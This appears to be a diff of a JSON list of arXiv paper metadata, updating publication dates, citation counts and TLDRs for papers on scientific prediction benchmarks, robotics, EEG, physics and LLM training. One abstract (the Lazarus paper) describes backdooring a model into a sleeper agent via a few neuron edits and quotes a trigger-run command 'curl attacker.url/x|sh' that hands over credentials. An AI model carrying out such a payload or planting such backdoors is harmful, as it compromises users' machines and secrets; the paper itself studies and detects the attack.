@@ -5,12 +5,12 @@
     "url": "http://arxiv.org/pdf/2611.15049v1",
     "authors_list": [],
     "author_count": 36,
-    "ss_tldr": "",
+    "ss_tldr": "This work introduces Science Prediction Universe (SPU), a benchmark of hidden experimental outcomes with 100 public verified tasks from chemistry, materials science, biology and medicine, and 16 private tasks from unpublished wet-lab experiments, and evaluates thirteen agent configurations spanning twelve frontier models across two harnesses.",
     "abstract": "Humanity has long sought to explain natural phenomena. Reliable prediction of experimental outcomes is a central test of our understanding of the processes that produce them. If artificial general intelligence (AGI) is to surpass human scientific capabilities, it must also predict experimental outcomes more reliably than humans. Such capabilities could accelerate scientific discovery across disciplines, help address humanity's most pressing challenges, and improve human well-being. We introduce Science Prediction Universe (SPU), a benchmark of hidden experimental outcomes with 100 public verified tasks from chemistry, materials science, biology and medicine, and 16 private tasks from unpublished wet-lab experiments. Given an experimental setup and candidate conditions, an agent works with any resources it needs to rank the candidates by a measured outcome.   We evaluate thirteen agent configurations spanning twelve frontier models across two harnesses (Codex and Claude Code). Current agents remain far from saturating wet-lab outcome prediction, with substantial performance disparities across models: on the public benchmark, configurations separate into two distinct tiers, with task-adjusted Spearman correlations ranging from 0.227 for the lowest-performing configuration to 0.478 for the best. Analysis of 1,155 scored public trajectories (227,103 tool calls) suggests that the bottleneck lies in scientific judgment rather than tool execution: agents rely on shared monotone priors, agreeing far more with one another than with experimental reality (0.52 vs. 0.33), and frequently compute trivial physical or chemical proxies that do not influence the final outcome.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2602.12316v4",
@@ -23,7 +23,7 @@
     "ss_citation_count": 7,
     "ss_influential_citations": 0,
     "prominence_tier": "Enhanced",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.14834v1",
@@ -31,12 +31,12 @@
     "url": "http://arxiv.org/pdf/2611.14834v1",
     "authors_list": [],
     "author_count": 5,
-    "ss_tldr": "",
+    "ss_tldr": "H, a lightweight framework that uses hindsight from a frozen VLA's own deployments to improve action verification, is proposed, a lightweight framework that uses hindsight from a frozen VLA's own deployments to improve action verification.",
     "abstract": "Vision-language-action (VLA) models have made significant progress in general-purpose robotic manipulation. However, sampled action sequences can be ineffective, while evaluating alternatives with computationally expensive verifiers adds latency at each policy query. In this work, we propose HDH, a lightweight framework that uses hindsight from a frozen VLA's own deployments to improve action verification. The framework has three stages. First, we deploy the policy and collect its autonomous rollouts. We then train a compact action verifier to assign each action chunk a predicted task-success score. Finally, the frozen VLA generates action candidates, and the verifier selects the candidate with the highest score for execution. Across four LIBERO-10 tasks, HDH achieves an average success rate of 82.3\\% and on three real-world manipulation tasks, HDH improves average success over the baseline policy by 22.6\\%.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.14736v1",
@@ -44,12 +44,12 @@
     "url": "http://arxiv.org/pdf/2611.14736v1",
     "authors_list": [],
     "author_count": 6,
-    "ss_tldr": "",
+    "ss_tldr": "A framework distinguishes population non-identifiability from finite-sample insta- bility, evaluates semantic orientation against statistical and random controls, and examines calibrated admis- sion and error-tolerant DAG retention.",
     "abstract": "Observational causal discovery often leaves causal di- rections unresolved or unstable. Large language mod- els (LLMs) can provide semantic information to resolve these directions, but incorrect proposals can exclude the true causal graph and invalidate downstream inference. We study three separate decisions: where to allocate semantic queries, which proposals to admit, and which causal graphs to retain. Our framework distinguishes population non-identifiability from finite-sample insta- bility, evaluates semantic orientation against statistical and random controls, and examines calibrated admis- sion and error-tolerant DAG retention. Experiments across benchmark networks show that semantic infor- mation improves recovery over coin-flip orientations, but targeting unstable edges has no established ad- vantage over matched-random allocation. The tested admission certificate cannot support nontrivial admis- sion with the available calibration tasks. Moreover, downstream retention depends on reference adequacy: learned references contain the true DAG in only three of 80 planned tasks. These findings separate the value of semantic information from the reliability of its alloca- tion, admission, and retention, and identify calibration size and reference adequacy as key limitations.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2602.09009v5",
@@ -62,7 +62,7 @@
     "ss_citation_count": 8,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2503.18998v2",
@@ -70,12 +70,12 @@
     "url": "http://arxiv.org/pdf/2503.18998v2",
     "authors_list": [],
     "author_count": 3,
-    "ss_tldr": "",
+    "ss_tldr": "The few-shot adapter with a cross-view fusion method called FACE for cross-subject EEG emotion recognition incorporates a cross-view fusion module that dynamically integrates global brain connectivity with localized patterns via subject-specific fusion weights to provide complementary emotional information.",
     "abstract": "Cross-subject EEG emotion recognition is challenged by significant inter-subject variability and intricately entangled intra-subject variability. Existing works have primarily addressed these challenges through domain adaptation or generalization strategies. However, they typically require extensive target subject data or demonstrate limited generalization performance to unseen subjects. Recent few-shot learning paradigms attempt to address these limitations but often encounter catastrophic overfitting during subject-specific adaptation with limited samples. This article introduces the few-shot adapter with a cross-view fusion method called FACE for cross-subject EEG emotion recognition, which leverages dynamic cross-view fusion and effective subject-specific adaptation. Specifically, FACE incorporates a cross-view fusion module that dynamically integrates global brain connectivity with localized patterns via subject-specific fusion weights to provide complementary emotional information. Moreover, the few-shot adapter module is proposed to enable rapid adaptation for unseen subjects while reducing overfitting by enhancing adapter structures with meta-learning. Experimental results on three public EEG emotion recognition benchmarks demonstrate the effectiveness of FACE under few-shot cross-subject evaluation.",
-    "ss_citation_count": 0,
+    "ss_citation_count": 5,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2603.27727v2",
@@ -83,12 +83,12 @@
     "url": "http://arxiv.org/pdf/2603.27727v2",
     "authors_list": [],
     "author_count": 8,
-    "ss_tldr": "",
+    "ss_tldr": "Three models to tag $^{14}$C photon hits in $e^+$ events with $^{14}$C pile-up, thereby suppressing its impact on the energy resolution at the hit level are proposed, leading to a large improvement in the resolution of total charge for events where $e^+$ and $^{14}$C photon hits strongly overlap in space and time.",
     "abstract": "Liquid scintillator detectors are widely used in neutrino experiments due to their low energy threshold and high energy resolution. Despite the tiny abundance of $^{14}$C in LS, the photons induced by the $\u03b2$ decay of the $^{14}$C isotope inevitably contaminate the signal, degrading the energy resolution. In this work, we propose three models to tag $^{14}$C photon hits in e$^+$ events with $^{14}$C pile-up, thereby suppressing its impact on the energy resolution at the hit level: a gated spatiotemporal graph neural network and two Transformer-based models with scalar and vector charge encoding. For a simulated test dataset in which each event contains one $^{14}\\mathrm{C}$ and one e$^+$ with kinetic energy below 5 MeV, the models achieve $^{14}\\mathrm{C}$ recall rates of 25%-48% while maintaining $\\mathrm{e}^{+}$ to $^{14}\\mathrm{C}$ misidentification below 1%, leading to a large improvement in the resolution of total charge for events where $\\mathrm{e}^{+}$ and $^{14}\\mathrm{C}$ photon hits strongly overlap in space and time.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.15802v1",
@@ -96,12 +96,12 @@
     "url": "http://arxiv.org/pdf/2611.15802v1",
     "authors_list": [],
     "author_count": 9,
-    "ss_tldr": "",
+    "ss_tldr": "RUMI is presented, a handheld universal manipulation interface matched to the Robotiq 2F-85 with exchangeable fingertip sensors that preserves the target gripper geometry while enabling natural input before contact and force measurement after contact and a haptic feedback mechanism that supports force-aware teleoperation for simulated and real robots.",
     "abstract": "Many manipulation tasks require carefully controlled contact forces for successful execution, yet large-scale, force-aware datasets remain scarce. Handheld interfaces can help by transmitting interaction forces directly through the operator's arm, but most existing designs are tailored to simple linear grippers and do not match the nonlinear mechanics of widely used robotic grippers. We present RUMI, a handheld universal manipulation interface matched to the Robotiq 2F-85 with exchangeable fingertip sensors that preserves the target gripper geometry while enabling natural input before contact and force measurement after contact. By integrating the tracking system into a virtual reality headset, our method provides real-time augmented reality feedback about the kinematic feasibility of motion on the target robot platform. We further introduce a haptic feedback mechanism that supports force-aware teleoperation for simulated and real robots. A user study shows fewer episodes containing joint-limit violations with live robot visualization and pose initialization (3/50) than without augmented reality (16/50). We additionally train imitation policies from demonstrations, collected using two different fingertip modalities enabled by the gripper-matched hardware, and assess the haptic interface's capability for collecting force-aware teleoperation datasets in simulation.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Emerging",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2605.13171v2",
@@ -114,7 +114,7 @@
     "ss_citation_count": 20,
     "ss_influential_citations": 1,
     "prominence_tier": "Emerging",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2505.13339v2",
@@ -127,7 +127,7 @@
     "ss_citation_count": 1,
     "ss_influential_citations": 0,
     "prominence_tier": "Emerging",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.14910v1",
@@ -135,12 +135,12 @@
     "url": "http://arxiv.org/pdf/2611.14910v1",
     "authors_list": [],
     "author_count": 7,
-    "ss_tldr": "",
+    "ss_tldr": "Mu-Edit is introduced, which mitigates multi-task conflicts via (1) conflict-aware ordering to minimize cumulative interference, and (2) dynamic low-rank approximation to expand the null space when ordering alone is insufficient.",
     "abstract": "Large language models (LLMs) require frequent knowledge updates across heterogeneous domains, but existing editing methods fail when applied sequentially to multi-task settings. We trace this collapse to inter-domain null-space misalignment: heterogeneous tasks induce distinct Jacobian geometries, causing their common null space to shrink dramatically and leaving insufficient admissible directions for conflict-free updates. We propose the Conflict Index to quantify this geometric interference, and introduce Mu-Edit, which mitigates multi-task conflicts via (1) conflict-aware ordering to minimize cumulative interference, and (2) dynamic low-rank approximation to expand the null space when ordering alone is insufficient. Experiments across five functional domains and three backbones show that Mu-Edit significantly outperforms existing baselines in multi-task editing performance while preserving general capabilities, and remains effective under incremental task arrival.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.15178v1",
@@ -148,12 +148,25 @@
     "url": "http://arxiv.org/pdf/2611.15178v1",
     "authors_list": [],
     "author_count": 5,
-    "ss_tldr": "",
+    "ss_tldr": "A Training-Free Omnimodal GRPO framework that keeps the backbone frozen and replaces gradient updates with auditable edits to a Hypergraph-Indexed Skill-Library, where skills are advantage-bearing nodes and compositions are hyperedges is proposed.",
     "abstract": "Reinforcement learning sharpens LLM reasoning, but parameter updates are expensive, forgetful, and opaque; training-free libraries swap gradients for a textual store but still use trajectory-level, correlation-based admission and flat structure. To address both, we propose HyperSkill, a Training-Free Omnimodal GRPO framework that keeps the backbone frozen and replaces gradient updates with auditable edits to a Hypergraph-Indexed Skill-Library, where skills are advantage-bearing nodes and compositions are hyperedges. It has three components: training-time distillation admits counterfactually checked skills and learns a protocol skill from failures; gated hypergraph retrieval injects advantage-ranked skills where a per-dataset gate admits them; and an execution protocol makes the frozen backbone commit to an answer. On 11 text, vision-language, and omnimodal benchmarks, HyperSkill is best or tied on every dataset and beats the best baseline by 13.0 average F1 points while keeping the backbone frozen. Our software and data are publicly available at https://github.com/LHRLAB/HyperSkill.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
+  },
+  {
+    "id": "2611.14912v1",
+    "title": "Rethinking \"RL Generalizes, SFT Memorizes\": The Role of SFT Data",
+    "url": "http://arxiv.org/pdf/2611.14912v1",
+    "authors_list": [],
+    "author_count": 6,
+    "ss_tldr": "This paper rethinks the distinction between large language models trained with Reinforcement Learning and Supervised Fine-Tuning through the lens of SFT training data on widely used Qwen2.5 and Qwen3 series models, and shows that larger datasets cover more tail methods and that these tail methods provide generalizable reasoning signals.",
+    "abstract": "Large language models trained with Reinforcement Learning (RL) with verifiable rewards exhibit strong reasoning ability and broad generalization, whereas models trained with Supervised Fine-Tuning (SFT) are often viewed as more prone to memorization and limited transfer. This paper rethinks this distinction through the lens of SFT training data on widely used Qwen2.5 and Qwen3 series models. First, we study the role of data source and show that it is critical: a carefully mixed SFT dataset substantially outperforms data generated solely by a larger model. Second, we study the role of data scale and show that matching the number of correct rollouts between SFT and RL greatly improves SFT generalization, while matching the total rollout budget enables SFT to generalize as well as RL. Combining these two factors further enables SFT to generalize even better than RL. Third, by using LLM annotations to characterize the solution methods in training rollouts, we show that larger datasets cover more tail methods and that these tail methods provide generalizable reasoning signals. Finally, we support these empirical findings theoretically by analyzing the training dynamics of shallow transformers under both RL and SFT.",
+    "ss_citation_count": 1,
+    "ss_influential_citations": 0,
+    "prominence_tier": "Elite",
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.14019v2",
@@ -166,20 +179,7 @@
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
-  },
-  {
-    "id": "2611.14912v1",
-    "title": "Rethinking \"RL Generalizes, SFT Memorizes\": The Role of SFT Data",
-    "url": "http://arxiv.org/pdf/2611.14912v1",
-    "authors_list": [],
-    "author_count": 6,
-    "ss_tldr": "",
-    "abstract": "Large language models trained with Reinforcement Learning (RL) with verifiable rewards exhibit strong reasoning ability and broad generalization, whereas models trained with Supervised Fine-Tuning (SFT) are often viewed as more prone to memorization and limited transfer. This paper rethinks this distinction through the lens of SFT training data on widely used Qwen2.5 and Qwen3 series models. First, we study the role of data source and show that it is critical: a carefully mixed SFT dataset substantially outperforms data generated solely by a larger model. Second, we study the role of data scale and show that matching the number of correct rollouts between SFT and RL greatly improves SFT generalization, while matching the total rollout budget enables SFT to generalize as well as RL. Combining these two factors further enables SFT to generalize even better than RL. Third, by using LLM annotations to characterize the solution methods in training rollouts, we show that larger datasets cover more tail methods and that these tail methods provide generalizable reasoning signals. Finally, we support these empirical findings theoretically by analyzing the training dynamics of shallow transformers under both RL and SFT.",
-    "ss_citation_count": 0,
-    "ss_influential_citations": 0,
-    "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.15040v1",
@@ -192,7 +192,7 @@
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.15118v1",
@@ -200,12 +200,12 @@
     "url": "http://arxiv.org/pdf/2611.15118v1",
     "authors_list": [],
     "author_count": 5,
-    "ss_tldr": "",
+    "ss_tldr": "It is shown that a method called Lazarus can turn a capable model into a sleeper agent by editing fewer than ten neurons, without model training, and underscores that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.",
     "abstract": "Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training.   Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps.   The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026.   On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable.   The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate.   Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Emerging",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2504.10552v4",
@@ -218,7 +218,7 @@
     "ss_citation_count": 25,
     "ss_influential_citations": 0,
     "prominence_tier": "Emerging",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.14560v1",
@@ -226,12 +226,12 @@
     "url": "http://arxiv.org/pdf/2611.14560v1",
     "authors_list": [],
     "author_count": 8,
-    "ss_tldr": "",
+    "ss_tldr": "An agentic framework that automates this read-level inspection with subagents that reason over evidence, generate investigative code, and return a real-or-artifact adjudications with an auditable reasoning trace all without training on existing data is presented.",
     "abstract": "Identifying a tumor's DNA mutations is central to cancer diagnosis and treatment, but distinguishing genuine mutations from sequencing artifacts is error-prone. In practice, genuine mutations are identified using fixed variant-allele-frequency (VAF) and depth thresholds which cannot separate artifacts from genuine mutations in the borderline low-VAF zone where they overlap. A laboratory specialist must manually inspect the read-level sequencing data, a slow step that has high inter-rater variability and causes diagnosis delays. We present AVA: Agentic Variant Adjudication; an agentic framework that automates this read-level inspection with subagents that reason over evidence, generate investigative code, and return a real-or-artifact adjudications with an auditable reasoning trace all without training on existing data. On both the SEQC2 DNA-seq benchmark and patient RNA-seq data, restricted to a subsample of borderline variants where thresholds fail, both closed-source (Claude Sonnet 5) and open-weight (GLM 5.3 Flash and Gemma 4 31b) agents outperform the best achievable VAF/depth thresholds. Ultimately, AVA is suited for privacy-constrained clinical deployment, since the framework can run on locally deployed open-weight models with descriptive reasoning traces to keep specialists in the loop.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Emerging",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
     "id": "2611.15067v1",
@@ -239,24 +239,24 @@
     "url": "http://arxiv.org/pdf/2611.15067v1",
     "authors_list": [],
     "author_count": 5,
-    "ss_tldr": "",
+    "ss_tldr": "CoLaX, a context-aware post-hoc explanation framework that builds on shapelet-driven Shapley attribution and conditions local-pattern relevance on a learned representation of the full sequence, achieves the highest AUPRC on ECG.",
     "abstract": "Post-hoc explanations for time series classifiers usually score local patterns, such as subsequences or shapelets, without regard to the rest of the sequence. Yet the same motif can carry different predictive meaning under different global temporal conditions, such as trends or regimes. We propose CoLaX, a context-aware post-hoc explanation framework that builds on shapelet-driven Shapley attribution and conditions local-pattern relevance on a learned representation of the full sequence. Global context acts at two levels: it produces sample-specific prototype weights and a temporally resolved signal that reweights the local activation map. The resulting context-conditioned segments are the players of a Shapley attribution game whose values come only from the frozen black-box classifier. On synthetic benchmarks where identical motifs change relevance across contexts, CoLaX improves AUPRC over the strongest baseline by 30\\% on average. On real-world data, it achieves the highest AUPRC on ECG. Additional ablations indicate that the gains come from input-dependent conditioning rather than from additional learnable weights. CoLaX is therefore most useful when recurring local motifs change relevance across sequence-level contexts.",
     "ss_citation_count": 0,
     "ss_influential_citations": 0,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   },
   {
-    "id": "2607.14203v2",
-    "title": "Instant NuRec: Feed-Forward 3D Gaussian Reconstruction for Driving Scene Simulation",
-    "url": "http://arxiv.org/pdf/2607.14203v2",
+    "id": "2606.03159v4",
+    "title": "NVIDIA OmniDreams: Real-Time Generative World Model for Closed-Loop Autonomous Vehicle Simulation",
+    "url": "http://arxiv.org/pdf/2606.03159v4",
     "authors_list": [],
-    "author_count": 17,
-    "ss_tldr": "Instant NuRec is a feed-forward neural reconstruction model that turns a short multi-view driving log into a fully simulatable 3D Gaussian Splatting (3DGS) world in a single forward pass and is compatible with AlpaSim for closed-loop simulation.",
-    "abstract": "3D simulation platforms are critical for autonomous driving because they enable end-to-end policy evaluation, thereby reducing development costs and improving safety. In recent years, neural simulation has become predominant, with methods such as NuRec playing a central role; however, these methods remain relatively slow and typically require per-scene tuning. In this work, we present Instant NuRec, a feed-forward neural reconstruction model that turns a short multi-view driving log into a fully simulatable 3D Gaussian Splatting (3DGS) world in a single forward pass. The model accepts multi-view input from a calibrated camera rig and emits a layered output consisting of static and dynamic 3DGS layers, a sky cubemap, and per-camera ISP corrections, while providing native support for non-pinhole camera models via 3DGUT. It reconstructs a 10-20-second multi-camera scene in roughly 1.5 seconds and achieves a PSNR on the Waymo Open Dataset that is 2.01 dB above the strongest evaluated baseline. Instant NuRec is deeply integrated into NuRec and is compatible with AlpaSim for closed-loop simulation.",
-    "ss_citation_count": 5,
-    "ss_influential_citations": 0,
+    "author_count": 33,
+    "ss_tldr": "Preliminary results indicate that a world-action model (WAM) post-trained from OmniDreams achieves strong performance on the Physical AI Autonomous Vehicles NuRec dataset, surpassing the VLA-based Alpamayo 1.5 research policy model while using only 1/5 the total parameters.",
+    "abstract": "As autonomous vehicle capabilities advance, the safe evaluation of driving policies in long-tail scenarios remains a critical bottleneck. In closed-loop simulation, the driving policy model actively interacts with the environment, where its actions dynamically update the simulator state and directly influence the next set of generated sensor observations. While recent reconstruction-based neural simulators offer photorealism, they are fundamentally constrained by their initial captured data and struggle to generalize to highly dynamic or novel scenes. To overcome these limitations, we introduce OmniDreams, a foundation generative world model mid- and post-trained from the Cosmos diffusion model to autoregressively generate action-conditioned videos in real time. By leveraging the rich visual priors of Cosmos and mid- and post-training on 21k hours of driving scenarios, OmniDreams synthesizes complex, unobserved phenomena that are hard for traditional simulators to capture, such as extreme weather and unpredictable dynamic agent behaviors. Crucially, it autoregressively conditions its photorealistic sensor generation on past frames, the current simulator state, and immediate driving actions. Deployed in a closed-loop system with the Alpamayo 1 policy model and AlpaSim orchestrator, OmniDreams acts as a highly responsive, reactive environment, providing a scalable and comprehensive solution for training and evaluating next-generation autonomous driving policies. We additionally show preliminary results indicating that a world-action model (WAM) post-trained from OmniDreams achieves strong performance on the Physical AI Autonomous Vehicles NuRec dataset, surpassing the VLA-based Alpamayo 1.5 research policy model while using only 1/5 the total parameters. These results highlight the potential for a real-time world model like OmniDreams to also serve as a backbone for policy architectures.",
+    "ss_citation_count": 20,
+    "ss_influential_citations": 3,
     "prominence_tier": "Elite",
-    "publication_date": "2026-11-14"
+    "publication_date": "2026-11-15"
   }
 ]
